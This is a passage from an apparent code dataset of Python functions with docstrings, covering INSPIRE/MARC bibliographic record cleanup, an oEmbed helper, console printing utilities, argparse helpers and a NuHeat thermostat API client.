            "def update_notes(self):\n        \"\"\"Remove INSPIRE specific notes.\"\"\"\n        fields = record_get_field_instances(self.record, '500')\n        for field in fields:\n            subs = field_get_subfields(field)\n            for sub in subs.get('a', []):\n                sub = sub.strip()  # remove any spaces before/after\n                if sub.startswith(\"*\") and sub.endswith(\"*\"):\n                    record_delete_field(self.record, tag=\"500\",\n                                        field_position_global=field[4])"
        ],
        [
            "def update_title_to_proceeding(self):\n        \"\"\"Move title info from 245 to 111 proceeding style.\"\"\"\n        titles = record_get_field_instances(self.record,\n                                            tag=\"245\")\n        for title in titles:\n            subs = field_get_subfields(title)\n            new_subs = []\n            if \"a\" in subs:\n                new_subs.append((\"a\", subs['a'][0]))\n            if \"b\" in subs:\n                new_subs.append((\"c\", subs['b'][0]))\n            record_add_field(self.record,\n                             tag=\"111\",\n                             subfields=new_subs)\n        record_delete_fields(self.record, tag=\"245\")\n        record_delete_fields(self.record, tag=\"246\")"
        ],
        [
            "def update_reportnumbers(self):\n        \"\"\"Update reportnumbers.\"\"\"\n        report_037_fields = record_get_field_instances(self.record, '037')\n        for field in report_037_fields:\n            subs = field_get_subfields(field)\n            for val in subs.get(\"a\", []):\n                if \"arXiv\" not in val:\n                    record_delete_field(self.record,\n                                        tag=\"037\",\n                                        field_position_global=field[4])\n                    new_subs = [(code, val[0]) for code, val in subs.items()]\n                    record_add_field(self.record, \"088\", subfields=new_subs)\n                    break"
        ],
        [
            "def update_isbn(self):\n        \"\"\"Remove dashes from ISBN.\"\"\"\n        isbns = record_get_field_instances(self.record, '020')\n        for field in isbns:\n            for idx, (key, value) in enumerate(field[0]):\n                if key == 'a':\n                    field[0][idx] = ('a', value.replace(\"-\", \"\").strip())"
        ],
        [
            "def update_dois(self):\n        \"\"\"Remove duplicate BibMatch DOIs.\"\"\"\n        dois = record_get_field_instances(self.record, '024', ind1=\"7\")\n        all_dois = {}\n        for field in dois:\n            subs = field_get_subfield_instances(field)\n            subs_dict = dict(subs)\n            if subs_dict.get('a'):\n                if subs_dict['a'] in all_dois:\n                    record_delete_field(self.record, tag='024', ind1='7', field_position_global=field[4])\n                    continue\n                all_dois[subs_dict['a']] = field"
        ],
        [
            "def update_date_year(self):\n        \"\"\"260 Date normalization.\"\"\"\n        dates = record_get_field_instances(self.record, '260')\n        for field in dates:\n            for idx, (key, value) in enumerate(field[0]):\n                if key == 'c':\n                    field[0][idx] = ('c', value[:4])\n                elif key == 't':\n                    del field[0][idx]\n        if not dates:\n            published_years = record_get_field_values(self.record, \"773\", code=\"y\")\n            if published_years:\n                record_add_field(\n                    self.record, \"260\", subfields=[(\"c\", published_years[0][:4])])\n            else:\n                other_years = record_get_field_values(self.record, \"269\", code=\"c\")\n                if other_years:\n                    record_add_field(\n                        self.record, \"260\", subfields=[(\"c\", other_years[0][:4])])"
        ],
        [
            "def update_languages(self):\n        \"\"\"041 Language.\"\"\"\n        language_fields = record_get_field_instances(self.record, '041')\n        language = \"eng\"\n        record_delete_fields(self.record, \"041\")\n        for field in language_fields:\n            subs = field_get_subfields(field)\n            if 'a' in subs:\n                language = self.get_config_item(subs['a'][0], \"languages\")\n                break\n        new_subs = [('a', language)]\n        record_add_field(self.record, \"041\", subfields=new_subs)"
        ],
        [
            "def generate_dirlist_html(FS, filepath):\n    \"\"\"\n    Generate directory listing HTML\n\n    Arguments:\n        FS (FS): filesystem object to read files from\n        filepath (str): path to generate directory listings for\n\n    Keyword Arguments:\n        list_dir (callable: list[str]): list file names in a directory\n        isdir (callable: bool): os.path.isdir\n\n    Yields:\n        str: lines of an HTML table\n    \"\"\"\n    yield '<table class=\"dirlist\">'\n    if filepath == '/':\n        filepath = ''\n    for name in FS.listdir(filepath):\n        full_path = pathjoin(filepath, name)\n        if FS.isdir(full_path):\n            full_path = full_path + '/'\n        yield u'<tr><td><a href=\"{0}\">{0}</a></td></tr>'.format(\n            cgi.escape(full_path))  # TODO XXX\n    yield '</table>'"
        ],
        [
            "def check_pkgs_integrity(filelist, logger, ftp_connector,\n                         timeout=120, sleep_time=10):\n    \"\"\"\n    Checks if files are not being uploaded to server.\n    @timeout - time after which the script will register an error.\n    \"\"\"\n    ref_1 = []\n    ref_2 = []\n    i = 1\n    print >> sys.stdout, \"\\nChecking packages integrity.\"\n    for filename in filelist:\n        # ref_1.append(self.get_remote_file_size(filename))\n        get_remote_file_size(ftp_connector, filename, ref_1)\n    print >> sys.stdout, \"\\nGoing to sleep for %i sec.\" % (sleep_time,)\n    time.sleep(sleep_time)\n\n    while sleep_time*i < timeout:\n        for filename in filelist:\n            # ref_2.append(self.get_remote_file_size(filename))\n            get_remote_file_size(ftp_connector, filename, ref_2)\n        if ref_1 == ref_2:\n            print >> sys.stdout, \"\\nIntegrity OK:)\"\n            logger.info(\"Packages integrity OK.\")\n            break\n        else:\n            print >> sys.stdout, \"\\nWaiting %d time for itegrity...\" % (i,)\n            logger.info(\"\\nWaiting %d time for itegrity...\" % (i,))\n            i += 1\n            ref_1, ref_2 = ref_2, []\n            time.sleep(sleep_time)\n    else:\n        not_finished_files = []\n        for count, val1 in enumerate(ref_1):\n            if val1 != ref_2[count]:\n                not_finished_files.append(filelist[count])\n\n        print >> sys.stdout, \"\\nOMG, OMG something wrong with integrity.\"\n        logger.error(\"Integrity check faild for files %s\"\n                     % (not_finished_files,))"
        ],
        [
            "def fix_name_capitalization(lastname, givennames):\n    \"\"\" Converts capital letters to lower keeps first letter capital. \"\"\"\n    lastnames = lastname.split()\n    if len(lastnames) == 1:\n        if '-' in lastname:\n            names = lastname.split('-')\n            names = map(lambda a: a[0] + a[1:].lower(), names)\n            lastname = '-'.join(names)\n        else:\n            lastname = lastname[0] + lastname[1:].lower()\n    else:\n        names = []\n        for name in lastnames:\n            if re.search(r'[A-Z]\\.', name):\n                names.append(name)\n            else:\n                names.append(name[0] + name[1:].lower())\n        lastname = ' '.join(names)\n        lastname = collapse_initials(lastname)\n    names = []\n    for name in givennames:\n        if re.search(r'[A-Z]\\.', name):\n            names.append(name)\n        else:\n            names.append(name[0] + name[1:].lower())\n    givennames = ' '.join(names)\n    return lastname, givennames"
        ],
        [
            "def extract_oembeds(self, text, maxwidth=None, maxheight=None, resource_type=None):\n        \"\"\"\n        Scans a block of text and extracts oembed data on any urls,\n        returning it in a list of dictionaries\n        \"\"\"\n        parser = text_parser()\n        urls = parser.extract_urls(text)\n        return self.handle_extracted_urls(urls, maxwidth, maxheight, resource_type)"
        ],
        [
            "def strip(self, text, *args, **kwargs):\n        \"\"\"\n        Try to maintain parity with what is extracted by extract since strip\n        will most likely be used in conjunction with extract\n        \"\"\"\n        if OEMBED_DEFAULT_PARSE_HTML:\n            extracted = self.extract_oembeds_html(text, *args, **kwargs)\n        else:\n            extracted = self.extract_oembeds(text, *args, **kwargs)\n        \n        matches = [r['original_url'] for r in extracted]\n        match_handler = lambda m: m.group() not in matches and m.group() or ''\n        \n        return re.sub(URL_RE, match_handler, text)"
        ],
        [
            "def autodiscover():\n    \"\"\"\n    Automatically build the provider index.\n    \"\"\"\n    import imp\n    from django.conf import settings\n    \n    for app in settings.INSTALLED_APPS:\n        try:\n            app_path = __import__(app, {}, {}, [app.split('.')[-1]]).__path__\n        except AttributeError:\n            continue\n        \n        try:\n            imp.find_module('oembed_providers', app_path)\n        except ImportError:\n            continue\n        \n        __import__(\"%s.oembed_providers\" % app)"
        ],
        [
            "def select(options=None):\n    \"\"\" pass in a list of options, promt the user to select one, and return the selected option or None \"\"\"\n    if not options:\n        return None\n    width = len(str(len(options)))\n    for x,option in enumerate(options):\n        sys.stdout.write('{:{width}}) {}\\n'.format(x+1,option, width=width))\n\n    sys.stdout.write('{:>{width}} '.format('#?', width=width+1))\n    sys.stdout.flush()\n    if sys.stdin.isatty():\n        # regular prompt\n        try:\n            response = raw_input().strip()\n        except (EOFError, KeyboardInterrupt):\n            # handle ctrl-d, ctrl-c\n            response = ''\n    else:\n        # try connecting to current tty, when using pipes\n        sys.stdin = open(\"/dev/tty\")\n        try:\n            response = ''\n            while True:\n                response += sys.stdin.read(1)\n                if response.endswith('\\n'):\n                    break\n        except (EOFError, KeyboardInterrupt):\n            sys.stdout.flush()\n            pass\n    try:\n        response = int(response) - 1\n    except ValueError:\n        return None\n    if response < 0 or response >= len(options):\n        return None\n    return options[response]"
        ],
        [
            "def main():\n    argparser = ArgumentParser()\n\n    subparsers = argparser.add_subparsers(dest='selected_subparser')\n\n    all_parser = subparsers.add_parser('all')\n    elsevier_parser = subparsers.add_parser('elsevier')\n    oxford_parser = subparsers.add_parser('oxford')\n    springer_parser = subparsers.add_parser('springer')\n\n    all_parser.add_argument('--update-credentials', action='store_true')\n\n    elsevier_parser.add_argument('--run-locally', action='store_true')\n    elsevier_parser.add_argument('--package-name')\n    elsevier_parser.add_argument('--path')\n    elsevier_parser.add_argument('--CONSYN', action='store_true')\n    elsevier_parser.add_argument('--update-credentials', action='store_true')\n    elsevier_parser.add_argument('--extract-nations', action='store_true')\n\n    oxford_parser.add_argument('--dont-empty-ftp', action='store_true')\n    oxford_parser.add_argument('--package-name')\n    oxford_parser.add_argument('--path')\n    oxford_parser.add_argument('--update-credentials', action='store_true')\n    oxford_parser.add_argument('--extract-nations', action='store_true')\n\n    springer_parser.add_argument('--package-name')\n    springer_parser.add_argument('--path')\n    springer_parser.add_argument('--update-credentials', action='store_true')\n    springer_parser.add_argument('--extract-nations', action='store_true')\n\n    '''\n    Transforms the argparse arguments from Namespace to dict and then to Bunch\n    Therefore it is not necessary to access the arguments using the dict syntax\n    The settings can be called like regular vars on the settings object\n    '''\n\n    settings = Bunch(vars(argparser.parse_args()))\n\n    call_package(settings)"
        ],
        [
            "def get_record(self, record):\n        \"\"\" Reads a dom xml element in oaidc format and\n            returns the bibrecord object \"\"\"\n        self.document = record\n        rec = create_record()\n        language = self._get_language()\n        if language and language != 'en':\n            record_add_field(rec, '041', subfields=[('a', language)])\n        publisher = self._get_publisher()\n        date = self._get_date()\n        if publisher and date:\n            record_add_field(rec, '260', subfields=[('b', publisher),\n                                                    ('c', date)])\n        elif publisher:\n            record_add_field(rec, '260', subfields=[('b', publisher)])\n        elif date:\n            record_add_field(rec, '260', subfields=[('c', date)])\n        title = self._get_title()\n        if title:\n            record_add_field(rec, '245', subfields=[('a', title)])\n        record_copyright = self._get_copyright()\n        if record_copyright:\n            record_add_field(rec, '540', subfields=[('a', record_copyright)])\n        subject = self._get_subject()\n        if subject:\n            record_add_field(rec, '650', ind1='1', ind2='7', subfields=[('a', subject),\n                                                                        ('2', 'PoS')])\n        authors = self._get_authors()\n        first_author = True\n        for author in authors:\n            subfields = [('a', author[0])]\n            for affiliation in author[1]:\n                subfields.append(('v', affiliation))\n            if first_author:\n                record_add_field(rec, '100', subfields=subfields)\n                first_author = False\n            else:\n                record_add_field(rec, '700', subfields=subfields)\n        identifier = self.get_identifier()\n        conference = identifier.split(':')[2]\n        conference = conference.split('/')[0]\n        contribution = identifier.split(':')[2]\n        contribution = contribution.split('/')[1]\n        record_add_field(rec, '773', subfields=[('p', 'PoS'),\n                                                ('v', conference.replace(' ', '')),\n                                                ('c', contribution),\n                                                ('y', date[:4])])\n        record_add_field(rec, '980', subfields=[('a', 'ConferencePaper')])\n        record_add_field(rec, '980', subfields=[('a', 'HEP')])\n        return rec"
        ],
        [
            "def progress(length, **kwargs):\n    \"\"\"display a progress that can update in place\n\n    example -- \n        total_length = 1000\n        with echo.progress(total_length) as p:\n            for x in range(total_length):\n                # do something crazy\n                p.update(x)\n\n    length -- int -- the total size of what you will be updating progress on\n    \"\"\"\n    quiet = False\n    progress_class = kwargs.pop(\"progress_class\", Progress)\n    kwargs[\"write_method\"] = istdout.info\n    kwargs[\"width\"] = kwargs.get(\"width\", globals()[\"WIDTH\"])\n    kwargs[\"length\"] = length\n    pbar = progress_class(**kwargs)\n    pbar.update(0)\n    yield pbar\n    pbar.update(length)\n    br()"
        ],
        [
            "def err(format_msg, *args, **kwargs):\n    '''print format_msg to stderr'''\n    exc_info = kwargs.pop(\"exc_info\", False)\n    stderr.warning(str(format_msg).format(*args, **kwargs), exc_info=exc_info)"
        ],
        [
            "def banner(*lines, **kwargs):\n    \"\"\"prints a banner\n\n    sep -- string -- the character that will be on the line on the top and bottom\n        and before any of the lines, defaults to *\n    count -- integer -- the line width, defaults to 80\n    \"\"\"\n    sep = kwargs.get(\"sep\", \"*\")\n    count = kwargs.get(\"width\", globals()[\"WIDTH\"])\n\n    out(sep * count)\n    if lines:\n        out(sep)\n\n        for line in lines:\n            out(\"{} {}\".format(sep, line))\n\n        out(sep)\n        out(sep * count)"
        ],
        [
            "def table(*columns, **kwargs):\n    \"\"\"\n    format columned data so we can easily print it out on a console, this just takes\n    columns of data and it will format it into properly aligned columns, it's not\n    fancy, but it works for most type of strings that I need it for, like server name\n    lists.\n\n    other formatting options:\n        http://stackoverflow.com/a/8234511/5006\n\n    other packages that probably do this way better:\n        https://stackoverflow.com/a/26937531/5006\n\n    :Example:\n        >>> echo.table([(1, 2), (3, 4), (5, 6), (7, 8), (9, 0)])\n        1  2\n        3  4\n        5  6\n        7  8\n        9  0\n        >>> echo.table([1, 3, 5, 7, 9], [2, 4, 6, 8, 0])\n        1  2\n        3  4\n        5  6\n        7  8\n        9  0\n\n    :param *columns: can either be a list of rows or multiple lists representing each\n        column in the table\n    :param **kwargs: dict\n        prefix -- string -- what you want before each row (eg, a tab)\n        buf_count -- integer -- how many spaces between longest col value and its neighbor\n        headers -- list -- the headers you want, must match column count\n        widths -- list -- the widths of each column you want to use, this doesn't have\n            to match column count, so you can do something like [0, 5] to set the\n            width of the second column\n        width -- int -- similar to widths except it will set this value for all columns\n    \"\"\"\n    ret = []\n    prefix = kwargs.get('prefix', '')\n    buf_count = kwargs.get('buf_count', 2)\n    if len(columns) == 1:\n        columns = list(columns[0])\n    else:\n        # without the list the zip iterator gets spent, I'm sure I can make this\n        # better\n        columns = list(zip(*columns))\n\n    headers = kwargs.get(\"headers\", [])\n    if headers:\n        columns.insert(0, headers)\n\n    # we have to go through all the rows and calculate the length of each\n    # column of each row\n    widths = kwargs.get(\"widths\", [])\n    row_counts = Counter()\n    for i in range(len(widths)):\n        row_counts[i] = int(widths[i])\n\n    width = int(kwargs.get(\"width\", 0))\n    for row in columns:\n        for i, c in enumerate(row):\n            if isinstance(c, basestring):\n                cl = len(c)\n            else:\n                cl = len(str(c))\n            if cl > row_counts[i]:\n                row_counts[i] = cl\n\n    width = int(kwargs.get(\"width\", 0))\n    if width:\n        for i in row_counts:\n            if row_counts[i] < width:\n                row_counts[i] = width\n\n    # actually go through and format each row\n    def colstr(c):\n        if isinstance(c, basestring): return c\n        return str(c)\n\n    def rowstr(row, prefix, row_counts):\n        row_format = prefix\n        cols = list(map(colstr, row))\n        for i in range(len(row_counts)):\n            c = cols[i]\n            # build the format string for each row, we use the row_counts found\n            # above to decide how much padding each column should get\n            # https://stackoverflow.com/a/9536084/5006\n            if re.match(r\"^\\d+(?:\\.\\d+)?$\", c):\n                if i == 0:\n                    row_format += \"{:>\" + str(row_counts[i]) + \"}\"\n                else:\n                    row_format += \"{:>\" + str(row_counts[i] + buf_count) + \"}\"\n            else:\n                row_format += \"{:<\" + str(row_counts[i] + buf_count) + \"}\"\n\n        return row_format.format(*cols)\n\n    for row in columns:\n        ret.append(rowstr(row, prefix, row_counts))\n\n    out(os.linesep.join(ret))"
        ],
        [
            "def prompt(question, choices=None):\n    \"\"\"echo a prompt to the user and wait for an answer\n\n    question -- string -- the prompt for the user\n    choices -- list -- if given, only exit when prompt matches one of the choices\n    return -- string -- the answer that was given by the user\n    \"\"\"\n\n    if not re.match(\"\\s$\", question):\n        question = \"{}: \".format(question)\n\n    while True:\n        if sys.version_info[0] > 2:\n            answer = input(question)\n\n        else:\n            answer = raw_input(question)\n\n        if not choices or answer in choices:\n            break\n\n    return answer"
        ],
        [
            "def get_records(self, url):\n        \"\"\"\n        Returns the records listed in the webpage given as\n        parameter as a xml String.\n\n        @param url: the url of the Journal, Book, Protocol or Reference work\n        \"\"\"\n        page = urllib2.urlopen(url)\n        pages = [BeautifulSoup(page)]\n        #content spread over several pages?\n        numpag = pages[0].body.findAll('span', attrs={'class': 'number-of-pages'})\n        if len(numpag) > 0:\n            if re.search('^\\d+$', numpag[0].string):\n                for i in range(int(numpag[0].string)-1):\n                    page = urllib2.urlopen('%s/page/%i' % (url, i+2))\n                    pages.append(BeautifulSoup(page))\n            else:\n                print(\"number of pages %s not an integer\" % (numpag[0].string))\n        impl = getDOMImplementation()\n        doc = impl.createDocument(None, \"collection\", None)\n        links = []\n        for page in pages:\n            links += page.body.findAll('p', attrs={'class': 'title'})\n            links += page.body.findAll('h3', attrs={'class': 'title'})\n        for link in links:\n            record = self._get_record(link)\n            doc.firstChild.appendChild(record)\n        return doc.toprettyxml()"
        ],
        [
            "def connect(self):\n        \"\"\"Logs into the specified ftp server and returns connector.\"\"\"\n        for tried_connection_count in range(CFG_FTP_CONNECTION_ATTEMPTS):\n            try:\n                self.ftp = FtpHandler(self.config.OXFORD.URL,\n                                      self.config.OXFORD.LOGIN,\n                                      self.config.OXFORD.PASSWORD)\n                self.logger.debug((\"Successful connection to the \"\n                                   \"Oxford University Press server\"))\n                return\n            except socket_timeout_exception as err:\n                self.logger.error(('Failed to connect %d of %d times. '\n                                   'Will sleep for %d seconds and try again.')\n                                  % (tried_connection_count+1,\n                                     CFG_FTP_CONNECTION_ATTEMPTS,\n                                     CFG_FTP_TIMEOUT_SLEEP_DURATION))\n                time.sleep(CFG_FTP_TIMEOUT_SLEEP_DURATION)\n            except Exception as err:\n                self.logger.error(('Failed to connect to the Oxford '\n                                   'University Press server. %s') % (err,))\n                break\n\n        raise LoginException(err)"
        ],
        [
            "def schedule_mode(self, mode):\n        \"\"\"\n        Set the thermostat mode\n\n        :param mode: The desired mode integer value.\n                     Auto = 1\n                     Temporary hold = 2\n                     Permanent hold = 3\n        \"\"\"\n        modes = [config.SCHEDULE_RUN, config.SCHEDULE_TEMPORARY_HOLD, config.SCHEDULE_HOLD]\n        if mode not in modes:\n            raise Exception(\"Invalid mode. Please use one of: {}\".format(modes))\n\n        self.set_data({\"ScheduleMode\": mode})"
        ],
        [
            "def set_target_fahrenheit(self, fahrenheit, mode=config.SCHEDULE_HOLD):\n        \"\"\"\n        Set the target temperature to the desired fahrenheit, with more granular control of the\n        hold mode\n\n        :param fahrenheit: The desired temperature in F\n        :param mode: The desired mode to operate in\n        \"\"\"\n        temperature = fahrenheit_to_nuheat(fahrenheit)\n        self.set_target_temperature(temperature, mode)"
        ],
        [
            "def set_target_celsius(self, celsius, mode=config.SCHEDULE_HOLD):\n        \"\"\"\n        Set the target temperature to the desired celsius, with more granular control of the hold\n        mode\n\n        :param celsius: The desired temperature in C\n        :param mode: The desired mode to operate in\n        \"\"\"\n        temperature = celsius_to_nuheat(celsius)\n        self.set_target_temperature(temperature, mode)"
        ],
        [
            "def set_target_temperature(self, temperature, mode=config.SCHEDULE_HOLD):\n        \"\"\"\n        Updates the target temperature on the NuHeat API\n\n        :param temperature: The desired temperature in NuHeat format\n        :param permanent: Permanently hold the temperature. If set to False, the schedule will\n                          resume at the next programmed event\n        \"\"\"\n        if temperature < self.min_temperature:\n            temperature = self.min_temperature\n\n        if temperature > self.max_temperature:\n            temperature = self.max_temperature\n\n        modes = [config.SCHEDULE_TEMPORARY_HOLD, config.SCHEDULE_HOLD]\n        if mode not in modes:\n            raise Exception(\"Invalid mode. Please use one of: {}\".format(modes))\n\n        self.set_data({\n            \"SetPointTemp\": temperature,\n            \"ScheduleMode\": mode\n        })"
        ],
        [
            "def load_config(filename=None, section_option_dict={}):\n    \"\"\"\n    This function returns a Bunch object from the stated config file.\n\n    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n    NOTE:\n        The values are not evaluated by default.\n    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n    filename:\n        The desired config file to read.\n        The config file must be written in a syntax readable to the\n        ConfigParser module -> INI syntax\n\n        [sectionA]\n        optionA1 = ...\n        optionA2 = ...\n\n    section_option_dict:\n        A dictionary that contains keys, which are associated to the sections\n        in the config file, and values, which are a list of the desired\n        options.\n        If empty, everything will be loaded.\n        If the lists are empty, everything from the sections will be loaded.\n\n    Example:\n        dict = {'sectionA': ['optionA1', 'optionA2', ...],\n                'sectionB': ['optionB1', 'optionB2', ...]}\n\n        config = get_config('config.cfg', dict)\n        config.sectionA.optionA1\n\n    Other:\n        Bunch can be found in configparser.py\n    \"\"\"\n\n    config = ConfigParser()\n    config.read(filename)\n\n    working_dict = _prepare_working_dict(config, section_option_dict)\n\n    tmp_dict = {}\n\n    for section, options in working_dict.iteritems():\n        tmp_dict[section] = {}\n        for option in options:\n            tmp_dict[section][option] = config.get(section, option)\n\n    return Bunch(tmp_dict)"
        ],
        [
            "def authenticate(self):\n        \"\"\"\n        Authenticate against the NuHeat API\n        \"\"\"\n        if self._session_id:\n            _LOGGER.debug(\"Using existing NuHeat session\")\n            return\n\n        _LOGGER.debug(\"Creating NuHeat session\")\n        post_data = {\n            \"Email\": self.username,\n            \"Password\": self.password,\n            \"application\": \"0\"\n        }\n        data = self.request(config.AUTH_URL, method=\"POST\", data=post_data)\n        session_id = data.get(\"SessionId\")\n        if not session_id:\n            raise Exception(\"Authentication error\")\n\n        self._session_id = session_id"
        ],
        [
            "def request(self, url, method=\"GET\", data=None, params=None, retry=True):\n        \"\"\"\n        Make a request to the NuHeat API\n\n        :param url: The URL to request\n        :param method: The type of request to make (GET, POST)\n        :param data: Data to be sent along with POST requests\n        :param params: Querystring parameters\n        :param retry: Attempt to re-authenticate and retry request if necessary\n        \"\"\"\n        headers = config.REQUEST_HEADERS\n\n        if params and self._session_id:\n            params['sessionid'] = self._session_id\n\n        if method == \"GET\":\n            response = requests.get(url, headers=headers, params=params)\n        elif method == \"POST\":\n            response = requests.post(url, headers=headers, params=params, data=data)\n\n        # Handle expired sessions\n        if response.status_code == 401 and retry:\n            _LOGGER.warn(\"NuHeat APIrequest unauthorized [401]. Try to re-authenticate.\")\n            self._session_id = None\n            self.authenticate()\n            return self.request(url, method=method, data=data, params=params, retry=False)\n\n        response.raise_for_status()\n        try:\n            return response.json()\n        except ValueError:\n            # No JSON object\n            return response"
        ],
        [
            "def handle_starttag(self, tag, attrs):\n        \"\"\"Return representation of html start tag and attributes.\"\"\"\n        if tag in self.mathml_elements:\n            final_attr = \"\"\n            for key, value in attrs:\n                final_attr += ' {0}=\"{1}\"'.format(key, value)\n            self.fed.append(\"<{0}{1}>\".format(tag, final_attr))"
        ],
        [
            "def handle_endtag(self, tag):\n        \"\"\"Return representation of html end tag.\"\"\"\n        if tag in self.mathml_elements:\n            self.fed.append(\"</{0}>\".format(tag))"
        ],
        [
            "def html_to_text(cls, html):\n        \"\"\"Return stripped HTML, keeping only MathML.\"\"\"\n        s = cls()\n        s.feed(html)\n        unescaped_data = s.unescape(s.get_data())\n        return escape_for_xml(unescaped_data, tags_to_keep=s.mathml_elements)"
        ],
        [
            "def is_instance(self):\n        \"\"\"return True if callback is an instance of a class\"\"\"\n        ret = False\n        val = self.callback\n        if self.is_class(): return False\n\n        ret = not inspect.isfunction(val) and not inspect.ismethod(val)\n#         if is_py2:\n#             ret = isinstance(val, types.InstanceType) or hasattr(val, '__dict__') \\\n#                 and not (hasattr(val, 'func_name') or hasattr(val, 'im_func'))\n# \n#         else:\n#             ret = not inspect.isfunction(val) and not inspect.ismethod(val)\n\n        return ret"
        ],
        [
            "def is_function(self):\n        \"\"\"return True if callback is a vanilla plain jane function\"\"\"\n        if self.is_instance() or self.is_class(): return False\n        return isinstance(self.callback, (Callable, classmethod))"
        ],
        [
            "def merge_kwargs(self, kwargs):\n        \"\"\"these kwargs come from the @arg decorator, they are then merged into any\n        keyword arguments that were automatically generated from the main function\n        introspection\"\"\"\n        if kwargs:\n            self.parser_kwargs.update(kwargs)\n\n        #self.parser_kwargs['dest'] = self.name\n        self.parser_kwargs.setdefault('dest', self.name)\n\n        # special handling of any passed in values\n        if 'default' in kwargs:\n            # NOTE -- this doesn't use .set_default() because that is meant to\n            # parse from the function definition so it actually has different syntax\n            # than what the .set_default() method does. eg, @arg(\"--foo\", default=[1, 2]) means\n            # that the default value should be an array with 1 and 2 in it, where main(foo=[1, 2])\n            # means foo should be constrained to choices=[1, 2]\n            self.parser_kwargs[\"default\"] = kwargs[\"default\"]\n            self.parser_kwargs[\"required\"] = False\n\n        elif 'action' in kwargs:\n            if kwargs['action'] in set(['store_false', 'store_true']):\n                self.parser_kwargs['required'] = False\n\n            elif kwargs['action'] in set(['version']):\n                self.parser_kwargs.pop('required', False)\n\n        else:\n            self.parser_kwargs.setdefault(\"required\", True)"
        ],
        [
            "def merge_from_list(self, list_args):\n        \"\"\"find any matching parser_args from list_args and merge them into this\n        instance\n\n        list_args -- list -- an array of (args, kwargs) tuples\n        \"\"\"\n        def xs(name, parser_args, list_args):\n            \"\"\"build the generator of matching list_args\"\"\"\n            for args, kwargs in list_args:\n                if len(set(args) & parser_args) > 0:\n                    yield args, kwargs\n\n                else:\n                    if 'dest' in kwargs:\n                        if kwargs['dest'] == name:\n                            yield args, kwargs\n\n        for args, kwargs in xs(self.name, self.parser_args, list_args):\n            self.merge_args(args)\n            self.merge_kwargs(kwargs)"
        ],
        [
            "def _fill_text(self, text, width, indent):\n        \"\"\"Overridden to not get rid of newlines\n\n        https://github.com/python/cpython/blob/2.7/Lib/argparse.py#L620\"\"\"\n        lines = []\n        for line in text.splitlines(False):\n            if line:\n                # https://docs.python.org/2/library/textwrap.html\n                lines.extend(textwrap.wrap(\n                    line.strip(),\n                    width,\n                    initial_indent=indent,\n                    subsequent_indent=indent\n                ))\n\n            else:\n                lines.append(line)\n\n        text = \"\\n\".join(lines)\n        return text"
        ],
        [
            "def make_user_agent(component=None):\n    \"\"\" create string suitable for HTTP User-Agent header \"\"\"\n    packageinfo = pkg_resources.require(\"harvestingkit\")[0]\n    useragent = \"{0}/{1}\".format(packageinfo.project_name, packageinfo.version)\n    if component is not None:\n        useragent += \" {0}\".format(component)\n    return useragent"
        ],
        [
            "def record_add_field(rec, tag, ind1='', ind2='', subfields=[],\n                     controlfield_value=''):\n    \"\"\"Add a MARCXML datafield as a new child to a XML document.\"\"\"\n    if controlfield_value:\n        doc = etree.Element(\"controlfield\",\n                            attrib={\n                                \"tag\": tag,\n                            })\n        doc.text = unicode(controlfield_value)\n    else:\n        doc = etree.Element(\"datafield\",\n                            attrib={\n                                \"tag\": tag,\n                                \"ind1\": ind1,\n                                \"ind2\": ind2,\n                            })\n        for code, value in subfields:\n            field = etree.SubElement(doc, \"subfield\", attrib={\"code\": code})\n            field.text = value\n    rec.append(doc)\n    return rec"
        ],
        [
            "def record_xml_output(rec, pretty=True):\n    \"\"\"Given a document, return XML prettified.\"\"\"\n    from .html_utils import MathMLParser\n    ret = etree.tostring(rec, xml_declaration=False)\n\n    # Special MathML handling\n    ret = re.sub(\"(&lt;)(([\\/]?{0}))\".format(\"|[\\/]?\".join(MathMLParser.mathml_elements)), '<\\g<2>', ret)\n    ret = re.sub(\"&gt;\", '>', ret)\n    if pretty:\n        # We are doing our own prettyfication as etree pretty_print is too insane.\n        ret = ret.replace('</datafield>', '  </datafield>\\n')\n        ret = re.sub(r'<datafield(.*?)>', r'  <datafield\\1>\\n', ret)\n        ret = ret.replace('</subfield>', '</subfield>\\n')\n        ret = ret.replace('<subfield', '    <subfield')\n        ret = ret.replace('record>', 'record>\\n')\n    return ret"
        ],
        [
            "def escape_for_xml(data, tags_to_keep=None):\n    \"\"\"Transform & and < to XML valid &amp; and &lt.\n\n    Pass a list of tags as string to enable replacement of\n    '<' globally but keep any XML tags in the list.\n    \"\"\"\n    data = re.sub(\"&\", \"&amp;\", data)\n    if tags_to_keep:\n        data = re.sub(r\"(<)(?![\\/]?({0})\\b)\".format(\"|\".join(tags_to_keep)), '&lt;', data)\n    else:\n        data = re.sub(\"<\", \"&lt;\", data)\n    return data"
        ],
        [
            "def format_arxiv_id(arxiv_id):\n    \"\"\"Properly format arXiv IDs.\"\"\"\n    if arxiv_id and \"/\" not in arxiv_id and \"arXiv\" not in arxiv_id:\n        return \"arXiv:%s\" % (arxiv_id,)\n    elif arxiv_id and '.' not in arxiv_id and arxiv_id.lower().startswith('arxiv:'):\n        return arxiv_id[6:]  # strip away arxiv: for old identifiers\n    else:\n        return arxiv_id"
        ],
        [
            "def fix_journal_name(journal, knowledge_base):\n    \"\"\"Convert journal name to Inspire's short form.\"\"\"\n    if not journal:\n        return '', ''\n    if not knowledge_base:\n        return journal, ''\n    if len(journal) < 2:\n        return journal, ''\n    volume = ''\n    if (journal[-1] <= 'Z' and journal[-1] >= 'A') \\\n            and (journal[-2] == '.' or journal[-2] == ' '):\n        volume += journal[-1]\n        journal = journal[:-1]\n    journal = journal.strip()\n\n    if journal.upper() in knowledge_base:\n        journal = knowledge_base[journal.upper()].strip()\n    elif journal in knowledge_base:\n        journal = knowledge_base[journal].strip()\n    elif '.' in journal:\n        journalnodots = journal.replace('. ', ' ')\n        journalnodots = journalnodots.replace('.', ' ').strip().upper()\n        if journalnodots in knowledge_base:\n            journal = knowledge_base[journalnodots].strip()\n\n    journal = journal.replace('. ', '.')\n    return journal, volume"
        ],
        [
